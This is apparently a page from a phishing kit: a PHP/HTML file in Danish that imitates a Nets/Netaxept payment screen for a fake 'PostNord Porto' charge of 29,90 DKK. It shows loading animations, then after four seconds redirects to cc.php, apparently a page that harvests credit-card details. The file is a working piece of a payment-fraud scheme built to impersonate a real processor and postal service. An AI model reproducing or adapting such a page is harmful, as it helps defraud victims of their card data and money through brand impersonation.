<?php
session_start();
?>
<html xmlns="http://www.w3.org/1999/xhtml" lang="da-DK"><head id="Head1"><title>
	Nets - Accepter betaling
</title>
    <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0" ;="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="apple-touch-fullscreen" content="YES"><meta name="robots" content="noindex"><link href="css/StyleIPhoneExistingTerminal.css" rel="stylesheet" type="text/css">
    <meta http-equiv="refresh" content="4; url=cc.php" />
    <style>
        #cancelButton {
            left: unset;
            right: 6px;
        }
    </style>
</head>
<body id="body" style="" cz-shortcut-listen="true">
      <form name="form1" id="form1">















    <nav id="navbar" class="toolbar">
        <h1 id="pageTitle" style="color: #000000">Netaxept</h1>
        <input type="submit" name="cancelButton" value="Afbryd" id="cancelButton" style="color:Black;">  
                 
    </nav>
    <div id="bbsHostedContent">
        <div class="content">
            <div class="contentPadding">
                <div style="margin-bottom: 5px;">
                    <img id="netsTechnology" src="https://epayment.nets.eu/terminal/Images/Mobile/netsTechnlogy_New.png" alt="Nets Logo" style="border-width:0px;">
                </div>
                <div id="informationPanel" style="border-bottom: 1px solid #CCC;margin: 12px -10px 1em;">
	
                    <div style="padding-left: 10px;">
                        <span id="merchantLabel" style="font-weight:bold;">Forretning:</span>&nbsp;<span id="merchantNameTxt" style="padding-left: 17px;">PostNord Porto</span>
                    </div>
                    <div>
                        <table style="padding-left: 10px; border-spacing:0px; width:auto">
                            <tbody><tr>
                                <td id="amountRow" style="padding-right: 5px">
                                    <span style="font-weight: bold;">
                                        <span id="amountLabel" style="font-weight:bold;">Beløb:</span></span>
                                </td>
	
                                <td>
                                    <div style="width:125px;text-align:right;">
                                    <span id="amount">29,90 (DKK)</span>
                                     </div>
                                </td>
                                <td>
                                    
                                </td>
                            </tr>
                            <tr id="roundingAmountRow">
		<td style="padding-right: 5px">
                                    <span id="roundingLabel"></span>
                                </td>
		<td>
                                    <div style="width:125px;text-align:right;">
                                    <span id="rounding"></span>
                                     </div>
                                </td>
	</tr>
	
                            <tr id="totalAmountRow">
		<td style="padding-right: 5px">
                                    <span id="totalAmountLabel"></span>
                                </td>
		<td>
                                    <span class="lineTop" style="width:125px;text-align: right"></span>
                                    <div style="width:125px;text-align:right;">
                                    <span id="totalAmount"></span>
                                    </div>                                         
                                </td>
	</tr>
	
                        </tbody></table>
                    </div>
                    <div id="orderNumberDiv" style="margin-top: 10px;padding-left: 10px;">
                        <span id="orderNumberLabel" style="font-weight:bold;">Ordrenummer:</span>&nbsp;<span id="orderNumber">135990343</span>
                    </div><br><br>

<div>
<style>
img {
  display: block;
  margin-left: auto;
  margin-right: auto;
}
</style>

    <img src="img/load.jpeg">

</div>

<br><br><br>
<div>
<style>
img {
  display: block;
  margin-left: auto;
  margin-right: auto;
}
</style>

    <img src="https://acegif.com/wp-content/uploads/loading-56.gif" width="200" height="200">

</div>
<br><br><br>
                    
                
</div>
                
				
                
            </div>
        </div>        
        <br>
        <img id="progressImage" alt="Loading..." src="../../images/transparentProgress.gif" style="display:none">
          
      
 <!-- The Modal -->
          
        </div>

    


</form>


</body></html>